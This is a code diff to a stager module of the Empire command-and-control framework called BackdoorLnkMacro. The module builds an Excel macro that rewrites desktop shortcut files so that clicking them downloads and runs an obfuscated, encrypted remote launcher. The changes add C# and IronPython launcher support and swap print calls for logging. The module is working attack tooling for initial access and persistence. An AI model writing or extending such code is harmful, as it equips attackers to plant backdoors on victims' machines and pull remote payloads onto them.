@@ -1,6 +1,7 @@
 from __future__ import print_function
 
 import datetime
+import logging
 import random
 import string
 from builtins import chr, object, range, str
@@ -12,13 +13,20 @@ from xlwt import Workbook
 
 from empire.server.common import helpers
 
+log = logging.getLogger(__name__)
+
 
 class Stager(object):
     def __init__(self, mainMenu, params=[]):
-
         self.info = {
             "Name": "BackdoorLnkMacro",
-            "Author": ["@G0ldenGunSec"],
+            "Authors": [
+                {
+                    "Name": "",
+                    "Handle": "@G0ldenGunSec",
+                    "Link": "",
+                },
+            ],
             "Description": "Generates a macro that backdoors .lnk files on the users desktop, backdoored lnk files in "
             "turn attempt to download & execute an empire launcher when the user clicks on them. "
             "Usage: Three files will be spawned from this, an xls document (either new or containing "
@@ -46,10 +54,7 @@ class Stager(object):
             )
         )
 
-        # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -73,6 +78,8 @@ class Stager(object):
                 "Description": "Language of the launcher to generate.",
                 "Required": True,
                 "Value": "powershell",
+                "SuggestedValues": ["powershell", "python", "ironpython", "csharp"],
+                "Strict": True,
             },
             "TargetEXEs": {
                 "Description": "Will backdoor .lnk files pointing to selected executables (do not include .exe "
@@ -139,12 +146,9 @@ class Stager(object):
             },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
         for param in params:
-            # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]["Value"] = value
@@ -248,24 +252,43 @@ class Stager(object):
                 proxyCreds=proxy_creds,
                 stagerRetries=stager_retries,
             )
-        else:
+        elif language == "powershell":
             launcher = self.mainMenu.stagers.generate_launcher(
                 listenerName=listener_name,
                 language=language,
                 encode=True,
                 obfuscate=obfuscate_script,
-                obfuscationCommand=obfuscate_command,
+                obfuscation_command=obfuscate_command,
                 userAgent=user_agent,
                 proxy=proxy,
                 proxyCreds=proxy_creds,
                 stagerRetries=stager_retries,
                 bypasses=bypasses,
             )
+        elif language in ["csharp", "ironpython"]:
+            if (
+                self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
+                log.error(
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
+                )
+                return ""
+
+            launcher = self.mainMenu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                encode=True,
+                listener_name=listener_name,
+            )
 
         launcher = launcher.replace('"', "'")
 
         if launcher == "":
-            print(helpers.color("[!] Error in launcher command generation."))
+            log.error("[!] Error in launcher command generation.")
             return ""
         else:
             try:
@@ -425,15 +448,12 @@ class Stager(object):
             macro += "next " + file_var + "\n"
             macro += "End Sub\n"
             active_sheet.row(input_row).hidden = True
-            print(helpers.color("\nWriting xls...\n", color="blue"))
+            log.info("Writing xls...")
             work_book.save(xls_out)
-            print(
-                helpers.color(
-                    "xls written to "
-                    + xls_out
-                    + "  please remember to add macro code to xls prior to use\n\n",
-                    color="green",
-                )
+            log.info(
+                "xls written to "
+                + xls_out
+                + "  please remember to add macro code to xls prior to use"
             )
 
             # encrypt the second stage code that will be dropped into the XML - this is the full empire stager that gets pulled once the user clicks on the backdoored shortcut
@@ -456,21 +476,17 @@ class Stager(object):
             cipher_text = helpers.encode_base64(b"".join([iv_buf, cipher_text]))
 
             # write XML to disk
-            print(helpers.color("Writing xml...\n", color="blue"))
+            log.info("Writing xml...")
             with open(xml_out, "wb") as file_write:
                 file_write.write(b'<?xml version="1.0"?>\n')
                 file_write.write(b"<main>")
                 file_write.write(cipher_text)
                 file_write.write(b"</main>\n")
-            print(
-                helpers.color(
-                    "xml written to "
-                    + xml_out
-                    + " please remember this file must be accessible by the target at this url: "
-                    + xml_path
-                    + "\n",
-                    color="green",
-                )
+            log.info(
+                "xml written to "
+                + xml_out
+                + " please remember this file must be accessible by the target at this url: "
+                + xml_path
             )
 
             return macro
